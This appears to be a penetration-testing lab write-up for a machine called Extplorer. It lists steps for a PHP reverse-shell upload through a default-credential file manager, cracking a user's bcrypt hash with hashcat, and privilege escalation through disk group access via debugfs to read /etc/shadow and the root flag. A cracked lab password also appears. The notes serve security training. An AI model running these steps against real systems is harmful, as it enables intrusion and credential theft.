# Extplorer \[Inter]

## Report

Extplorer interface allows us to perform file upload to obtain a reverse shell via PHP. Extract a hash from a PHP file within web root and crack hash for user 'dora'. Dora is part of disk group which can be abused to perform system-wide read access, reading the root flag and shadow file to obtain shell as root

## Cheatsheet

```bash
hashcat -m 3200 hash.txt /opt/rockyou.txt

df -h
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv [Main partition]
cat /root/proof.txt
cat /etc/shadow [crack root password]
```

## Loot

### Enumeration

192.168.53.16

#### 80

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption><p>setup-config.php</p></figcaption></figure>

ffuf shows default wordpress directories and the setup seems to be a sham

{% hint style="info" %}
filemanager redirects to extplorer which logs in via admin:admin
{% endhint %}

### Attack Vectors

**/var/www/html/filemanager/config/.htusers.php - get sauce \[creds for dora]**

/var/www/html/filemanager/config/.htaccess

### PrivEsc

<div align="left"><figure><img src="../../../.gitbook/assets/image (128).png" alt=""><figcaption><p>User part of disk group can be abused to read files across the entire system</p></figcaption></figure></div>

### Creds

Users

| 3200 | bcrypt $2\*$, Blowfish (Unix) |
| ---- | ----------------------------- |

'dora' '$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS'

dora:doraemon

### Proof

{% embed url="https://www.hackingarticles.in/disk-group-privilege-escalation/" %}
